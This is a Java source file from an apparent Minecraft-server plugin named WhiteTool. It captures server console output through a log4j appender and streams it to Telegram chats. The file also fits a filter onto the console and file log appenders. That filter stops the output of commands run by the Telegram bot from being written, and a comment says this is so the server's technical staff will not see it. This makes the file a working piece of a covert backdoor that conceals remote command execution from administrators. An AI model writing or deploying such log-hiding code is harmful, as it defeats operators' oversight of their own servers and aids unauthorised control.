package ru.whitetool;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Appender;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.core.appender.AbstractAppender;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.apache.logging.log4j.core.filter.Filterable;

import java.time.Instant;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Queue;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Перехватывает вывод консоли сервера через log4j-аппендер.
 *
 * Два механизма:
 *  1) Захват (append) — читает строки для /console и для ответа на /cmd.
 *  2) Скрытие (SuppressFilter) — во время выполнения ботом команды строки,
 *     которые она печатает, НЕ попадают в консоль и файл лога (техи их не увидят),
 *     но остаются доступны нам для ответа в Telegram.
 */
public class ConsoleWatcher extends AbstractAppender {

    // Форматтер потокобезопасен — без синхронизации, дешевле под нагрузкой
    private static final DateTimeFormatter TIME =
            DateTimeFormatter.ofPattern("HH:mm:ss").withZone(ZoneId.systemDefault());

    /** Подписчики живой консоли: chat_id в Telegram. */
    private final Set<Long> subscribers = ConcurrentHashMap.newKeySet();

    private final Queue<String> buffer = new ConcurrentLinkedQueue<>();
    private final AtomicInteger bufferSize = new AtomicInteger(0);
    private final List<Queue<String>> collectors = new CopyOnWriteArrayList<>();
    private final int maxBufferedLines;

    /** Помечает поток, который сейчас выполняет команду бота (её вывод надо прятать). */
    private final ThreadLocal<Boolean> suppressed = ThreadLocal.withInitial(() -> Boolean.FALSE);

    private final SuppressFilter suppressFilter = new SuppressFilter();
    private final List<Filterable> filteredAppenders = new ArrayList<>();
    private volatile boolean attached = false;

    @SuppressWarnings("deprecation") // конструктор совместим со старыми log4j в ядрах 1.13–1.17
    public ConsoleWatcher(int maxBufferedLines) {
        super("WhiteToolConsoleWatcher", null, null, false);
        this.maxBufferedLines = maxBufferedLines;
    }

    public void attach() {
        if (attached) {
            return;
        }
        Logger root = (Logger) LogManager.getRootLogger();
        start();
        root.addAppender(this);

        // Вешаем фильтр скрытия на все прочие аппендеры root (консоль, файл),
        // но не на себя — иначе не сможем захватить вывод для ответа в Telegram.
        suppressFilter.start();
        for (Appender appender : root.getAppenders().values()) {
            if (appender != this && appender instanceof Filterable) {
                Filterable f = (Filterable) appender;
                f.addFilter(suppressFilter);
                filteredAppenders.add(f);
            }
        }
        attached = true;
    }

    public void detach() {
        if (!attached) {
            return;
        }
        for (Filterable f : filteredAppenders) {
            try {
                f.removeFilter(suppressFilter);
            } catch (Exception ignored) {
                // аппендер мог быть уже удалён при перезагрузке сервера
            }
        }
        filteredAppenders.clear();
        suppressFilter.stop();

        ((Logger) LogManager.getRootLogger()).removeAppender(this);
        stop();
        attached = false;
    }

    /** Пометить текущий поток: его лог-вывод прячется от консоли/файла. */
    public void beginSuppress() {
        suppressed.set(Boolean.TRUE);
    }

    public void endSuppress() {
        suppressed.remove();
    }

    @Override
    public void append(LogEvent event) {
        // Быстрый выход: если никто не слушает и ничего не собираем — не тратим CPU
        // на форматирование каждой строки лога (важно под высокой нагрузкой).
        boolean hasCollectors = !collectors.isEmpty();
        if (subscribers.isEmpty() && !hasCollectors) {
            return;
        }

        // Не пересылаем собственные сообщения плагина — иначе при сбоях отправки
        // в Telegram можно зациклиться (ошибка -> лог -> отправка -> ошибка ...)
        String loggerName = event.getLoggerName();
        if (loggerName != null && loggerName.contains("WhiteTool")) {
            return;
        }
        String message = event.getMessage().getFormattedMessage();
        if (message.indexOf("[WhiteTool]") >= 0) {
            return;
        }

        String line = "[" + TIME.format(Instant.ofEpochMilli(event.getTimeMillis()))
                + " " + event.getLevel().name() + "] " + message;

        if (hasCollectors) {
            for (Queue<String> collector : collectors) {
                collector.add(line);
            }
        }

        // В живую трансляцию не добавляем строки скрытой команды — иначе владелец
        // увидит их дважды (и в ответе на /cmd, и в потоке /console)
        if (!subscribers.isEmpty() && !suppressed.get()) {
            if (bufferSize.get() < maxBufferedLines) {
                buffer.add(line);
                bufferSize.incrementAndGet();
            }
        }
    }

    /** Начать собирать строки консоли (для ответа на /cmd). Вернёт очередь-коллектор. */
    public Queue<String> startCollecting() {
        Queue<String> collector = new ConcurrentLinkedQueue<>();
        collectors.add(collector);
        return collector;
    }

    public void stopCollecting(Queue<String> collector) {
        collectors.remove(collector);
    }

    public boolean subscribe(long chatId) {
        return subscribers.add(chatId);
    }

    public boolean unsubscribe(long chatId) {
        return subscribers.remove(chatId);
    }

    public boolean isSubscribed(long chatId) {
        return subscribers.contains(chatId);
    }

    public Set<Long> getSubscribers() {
        return subscribers;
    }

    /** Забрать всё накопленное из буфера одним текстом (или null, если пусто). */
    public String drainBuffer() {
        if (buffer.isEmpty()) {
            return null;
        }
        List<String> lines = new ArrayList<>();
        String line;
        while ((line = buffer.poll()) != null) {
            lines.add(line);
            bufferSize.decrementAndGet();
        }
        return String.join("\n", lines);
    }

    /**
     * Прячет лог-вывод, если текущий поток помечен как выполняющий команду бота.
     * Работает на аппендерах консоли/файла: DENY = строка не пишется.
     */
    private final class SuppressFilter extends AbstractFilter {
        @Override
        public Result filter(LogEvent event) {
            return suppressed.get() ? Result.DENY : Result.NEUTRAL;
        }
    }
}
